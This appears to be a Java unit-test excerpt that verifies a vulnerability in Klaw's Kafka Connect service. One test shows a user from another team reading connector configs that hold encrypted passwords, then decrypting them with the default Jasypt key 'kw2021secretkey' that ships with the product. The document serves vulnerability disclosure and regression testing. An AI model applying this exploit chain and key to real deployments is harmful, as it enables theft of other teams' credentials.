/**
   * C128 EXP: GET /getConnectorOverview returns connectorConfig (incl. Jasypt-encrypted secrets)
   * to any VIEW_CONNECTORS user — no team ownership check. Default
   * klaw.jasypt.encryptor.secretkey=kw2021secretkey ships in application.properties, so any
   * authenticated attacker can decrypt foreign-team Connect credentials offline.
   * Contrast: getConnectorDetailsPerEnvToEdit correctly team-gates (Order 22).
   */
  @Test
  @Order(30)
  public void C128_getConnectorOverview_foreignTeam_leaksJasyptEncryptedSecrets() throws Exception {
    final int victimTeamId = 8;
    final int attackerTeamId = 99;
    final String plaintextSecret = "SuperSecretConnectPwd-C128";

    BasicTextEncryptor encryptor = new BasicTextEncryptor();
    encryptor.setPassword("kw2021secretkey"); // default from shipped application.properties
    String encPassword = "ENC(" + encryptor.encrypt(plaintextSecret) + ")";

    String storedConfig =
        "{\n"
            + "    \"name\": \"conn1\",\n"
            + "    \"topics\":\"victopic\",\n"
            + "    \"tasks.max\": \"1\",\n"
            + "    \"connector.password\":\""
            + encPassword
            + "\",\n"
            + "    \"jdbc.username\":\"victim_db_user\",\n"
            + "    \"connector.class\": \"io.confluent.connect.storage.tools.SchemaSourceConnector\"\n"
            + "}";

    KwKafkaConnector victimConn = new KwKafkaConnector();
    victimConn.setConnectorId(1);
    victimConn.setConnectorName(CONNECTOR_NAME);
    victimConn.setEnvironment("1");
    victimConn.setTeamId(victimTeamId);
    victimConn.setTenantId(TENANT_ID);
    victimConn.setConnectorConfig(storedConfig);

    stubUserInfo();
    when(commonUtilsService.getTenantId(any())).thenReturn(TENANT_ID);
    // Attacker is NOT on the owning team
    when(commonUtilsService.getTeamId(eq(USERNAME))).thenReturn(attackerTeamId);
    when(handleDbRequests.getConnectors(eq(CONNECTOR_NAME), eq(TENANT_ID)))
        .thenReturn(List.of(victimConn));
    when(commonUtilsService.getEnvsFromUserId(eq(USERNAME))).thenReturn(Set.of("0", "1", "2", "3"));
    when(commonUtilsService.getEnvProperty(
            eq(TENANT_ID), eq("REQUEST_CONNECTORS_OF_KAFKA_CONNECT_ENVS")))
        .thenReturn("0,1,2,3");
    when(commonUtilsService.getEnvProperty(eq(TENANT_ID), eq(ORDER_OF_KAFKA_CONNECT_ENVS)))
        .thenReturn("0,1,2");
    when(manageDatabase.getKafkaConnectEnvList(anyInt())).thenReturn(generateEnvironments());
    when(manageDatabase
            .getHandleDbRequests()
            .getConnectorsFromName(eq(CONNECTOR_NAME), eq(TENANT_ID)))
        .thenReturn(List.of(victimConn));
    when(manageDatabase
            .getHandleDbRequests()
            .existsConnectorRequest(
                eq(CONNECTOR_NAME), eq(RequestStatus.CREATED.value), eq("1"), eq(TENANT_ID)))
        .thenReturn(false);
    when(manageDatabase
            .getHandleDbRequests()
            .existsClaimConnectorRequest(
                eq(CONNECTOR_NAME), eq(RequestStatus.CREATED.value), eq(TENANT_ID)))
        .thenReturn(false);
    when(manageDatabase
            .getHandleDbRequests()
            .existsConnectorRequest(
                eq(CONNECTOR_NAME), eq(RequestStatus.CREATED.value), eq(TENANT_ID)))
        .thenReturn(false);
    when(manageDatabase.getTeamNameFromTeamId(eq(TENANT_ID), eq(victimTeamId)))
        .thenReturn("VictimTeam");

    ConnectorOverview response =
        kafkaConnectControllerService.getConnectorOverview(CONNECTOR_NAME, "1");

    assertThat(response).isNotNull();
    assertThat(response.getConnectorInfoList()).isNotEmpty();
    assertThat(response.getConnectorInfoList().get(0).isConnectorOwner()).isFalse();
    assertThat(response.getConnectorInfoList().get(0).getTeamId()).isEqualTo(victimTeamId);

    String leakedConfig = response.getConnectorInfoList().get(0).getConnectorConfig();
    assertThat(leakedConfig).contains("ENC(");
    assertThat(leakedConfig).contains("connector.password");

    // Offline decrypt with the shipped default Jasypt key (CWE-321)
    BasicTextEncryptor attackerDecryptor = new BasicTextEncryptor();
    attackerDecryptor.setPassword("kw2021secretkey");
    int start = leakedConfig.indexOf("ENC(") + 4;
    int end = leakedConfig.indexOf(")", start);
    String cipherOnly = leakedConfig.substring(start, end);
    String recovered = attackerDecryptor.decrypt(cipherOnly);
    assertThat(recovered).isEqualTo(plaintextSecret);
  }

  /** C128 NEG contrast: edit path refuses foreign-team connector (already Order 22; reaffirm). */
  @Test
  @Order(31)
  public void C128_getConnectorDetailsPerEnvToEdit_foreignTeam_stillBlocked() {
    stubUserInfo();
    when(commonUtilsService.getTenantId(any())).thenReturn(TENANT_ID);
    when(commonUtilsService.getTeamId(eq(USERNAME))).thenReturn(8);
    when(handleDbRequests.getConnectors(eq(CONNECTOR_NAME), eq(TENANT_ID)))
        .thenReturn(generateKafkaConnectors(2));
    when(commonUtilsService.getEnvsFromUserId(eq(USERNAME))).thenReturn(Set.of("0", "1", "2", "3"));
    when(manageDatabase.getHandleDbRequests().getConnectors(eq(CONNECTOR_NAME), eq(TENANT_ID)))
        .thenReturn(generateKafkaConnectors(2));
    when(manageDatabase.getHandleDbRequests().getAllTeamsOfUsers(eq(USERNAME), eq(101)))
        .thenReturn(List.of(createTeam("Natto", 23)));

    assertThatThrownBy(
            () ->
                kafkaConnectControllerService.getConnectorDetailsPerEnvToEdit("1", CONNECTOR_NAME))
        .isInstanceOf(KlawBadRequestException.class)
        .hasMessage("Sorry, your team does not own the connector !!");
  }

  